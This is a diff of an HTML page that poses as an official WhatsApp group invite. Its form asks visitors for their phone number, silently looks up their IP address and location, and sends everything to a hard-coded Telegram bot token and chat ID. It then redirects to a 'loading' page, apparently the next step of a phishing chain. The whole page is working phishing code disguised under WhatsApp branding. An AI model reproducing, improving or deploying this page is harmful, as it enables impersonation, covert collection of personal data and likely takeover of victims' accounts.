@@ -2,138 +2,66 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>WhatsApp Invite Form</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-    }
-
-    .navbar {
-      background-color: #4CAF50;
-      padding: 15px 20px;
-      color: white;
-      font-size: 18px;
-      text-align: center;
-    }
-
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #f5f5f5; }
+    .navbar { background-color: #4CAF50; padding: 15px 20px; color: white; font-size: 18px; text-align: center; }
     .container {
-      max-width: 400px;
-      margin: 60px auto;
-      background-color: #fff;
-      padding: 30px 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-      text-align: center;
+      max-width: 400px; margin: 60px auto; background-color: #fff;
+      padding: 30px 20px; border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); text-align: center;
     }
-
-    .logo {
-      width: 80px;
-      height: 80px;
-      object-fit: contain;
-      margin-bottom: 10px;
-    }
-
+    .logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 10px; }
     .sub-image {
-      width: 100%;
-      max-height: 200px;
-      object-fit: cover;
-      border-radius: 8px;
-      margin-bottom: 20px;
+      width: 100%; max-height: 200px; object-fit: cover;
+      border-radius: 8px; margin-bottom: 20px;
     }
-
-    h2 {
-      color: #333;
-      margin-bottom: 20px;
-    }
-
+    h2 { color: #333; margin-bottom: 20px; }
     .phone-input {
-      display: flex;
-      align-items: center;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      width: 100%;
+      display: flex; align-items: center; padding: 12px;
+      border: 1px solid #ccc; border-radius: 8px;
+      font-size: 16px; margin-bottom: 20px; width: 100%;
       box-sizing: border-box;
     }
-
     button {
-      background: linear-gradient(to right, #43e97b, #38f9d7);
-      color: #fff;
-      padding: 15px 25px;
-      font-size: 16px;
-      font-weight: bold;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 20px;
-      transition: background 0.3s ease;
+      background: linear-gradient(to right, #43e97b, #38f9d7); color: #fff;
+      padding: 15px 25px; font-size: 16px; font-weight: bold;
+      border: none; border-radius: 30px; cursor: pointer;
+      width: 100%; margin-top: 20px; transition: background 0.3s ease;
     }
-
     button:hover {
       background: linear-gradient(to right, #38f9d7, #43e97b);
     }
-
     footer {
-      background-color: #2e7d32;
-      color: white;
-      padding: 40px 20px;
-      text-align: center;
+      background-color: #2e7d32; color: white;
+      padding: 40px 20px; text-align: center;
     }
-
     footer .footer-links {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 15px;
-      margin-bottom: 20px;
+      display: flex; flex-wrap: wrap; justify-content: center;
+      gap: 15px; margin-bottom: 20px;
     }
-
-    footer .footer-links p {
-      margin: 5px 10px;
-    }
-
-    footer .footer-bottom {
-      font-size: 14px;
-      opacity: 0.8;
-    }
+    footer .footer-links p { margin: 5px 10px; }
+    footer .footer-bottom { font-size: 14px; opacity: 0.8; }
   </style>
 </head>
 <body>
-  <div class="navbar">
-    🌿 WhatsApp Invite
-  </div>
-
+  <div class="navbar">🌿 WhatsApp Invite</div>
   <div class="container">
-    <img src="DSxOAUB0raA.png" alt="Banner Image" class="sub-image" />
+    <img src="DSxOAUB0raA.png" alt="Banner" class="sub-image" />
     <img src="172245867233593622.png" alt="Logo" class="logo" />
     <h2>Join Our WhatsApp Group</h2>
     <form id="phone-form">
-      <input id="phone" class="phone-input" type="tel" placeholder="" required autocomplete="off" />
+      <input id="phone" class="phone-input" type="tel" placeholder="Enter your phone number" required autocomplete="off" />
       <button type="submit">Join Now</button>
     </form>
   </div>
-
   <footer>
     <div class="footer-links">
-      <p>Use WhatsApp</p>
-      <p>Features</p>
-      <p>WhatsApp Web</p>
-      <p>Download</p>
-      <p>About Us</p>
-      <p>Business</p>
-      <p>Security</p>
-      <p>Privacy & Terms</p>
-      <p>Get in Touch</p>
-      <p>Contact Us</p>
-      <p>Facebook | X (Twitter)</p>
-      <p>Meta Logo</p>
+      <p>Use WhatsApp</p><p>Features</p><p>WhatsApp Web</p><p>Download</p>
+      <p>About Us</p><p>Business</p><p>Security</p><p>Privacy & Terms</p>
+      <p>Get in Touch</p><p>Contact Us</p><p>Facebook | X (Twitter)</p><p>Meta Logo</p>
     </div>
     <div class="footer-bottom">© 2025 WhatsApp</div>
   </footer>
@@ -141,19 +69,30 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   <script>
     const input = document.querySelector("#phone");
+
     const iti = window.intlTelInput(input, {
       initialCountry: "auto",
       geoIpLookup: function (callback) {
         fetch("https://ipapi.co/json")
-          .then((resp) => resp.json())
+          .then((res) => res.json())
           .then((data) => {
-            const countryCode = data && data.country ? data.country : "us";
-            callback(countryCode.toLowerCase());
-            input.placeholder = `+${data.country_calling_code.replace('+', '')} 123 456 7890`;
+            const countryCode = data.country ? data.country.toLowerCase() : "us";
+            callback(countryCode);
+
+            // Set placeholder number
+            const exampleNumbers = {
+              us: "+1 415 555 2671",
+              gb: "+44 7700 900123",
+              fr: "+33 6 12 34 56 78",
+              de: "+49 1512 3456789",
+              in: "+91 98765 43210",
+              ma: "+212 612-345678"
+            };
+            input.placeholder = exampleNumbers[countryCode] || "+1 415 555 2671";
           })
           .catch(() => {
             callback("us");
-            input.placeholder = "+1 123 456 7890";
+            input.placeholder = "+1 415 555 2671";
           });
       },
       utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
@@ -168,41 +107,42 @@
       }
 
       const phoneNumber = iti.getNumber();
-      const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
-      const chatId = "7196613507";
+      const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY"; // ✅ Replace with your bot token
+      const chatId = "7196613507"; // ✅ Replace with your chat ID
 
       fetch("https://ipapi.co/json")
-        .then((response) => response.json())
-        .then((data) => {
-          const ip = data.ip || "Unavailable";
-          const country = data.country_name || "Unavailable";
-          const city = data.city || "Unavailable";
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip || "N/A";
+          const country = data.country_name || "N/A";
+          const city = data.city || "N/A";
+          const countryFlag = data.country ? `https://flagcdn.com/48x36/${data.country.toLowerCase()}.png` : "";
 
-          const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🌇️ City: ${city}\n💻 IP: ${ip}`;
+          const message = `📥 New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}\n🏳️ Flag: ${countryFlag}`;
 
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id: chatId,
               text: message
             })
           })
-            .then(response => response.json())
-            .then(data => {
-              if (!data.ok) {
-                console.error("Telegram API error:", data);
-                alert(`Telegram API error: ${data.description}`);
-              } else {
-                window.location.href = "loading.html";
-              }
-            })
-            .catch(err => {
-              console.error("Fetch error:", err);
-              alert("An error occurred. Please try again.");
-            });
+          .then(resp => resp.json())
+          .then(data => {
+            if (data.ok) {
+              window.location.href = "loading.html";
+            } else {
+              alert("Telegram Error: " + data.description);
+            }
+          })
+          .catch(err => {
+            console.error("Telegram error:", err);
+            alert("Could not send message.");
+          });
+        })
+        .catch(() => {
+          alert("Could not fetch your location. Try again.");
         });
     });
   </script>
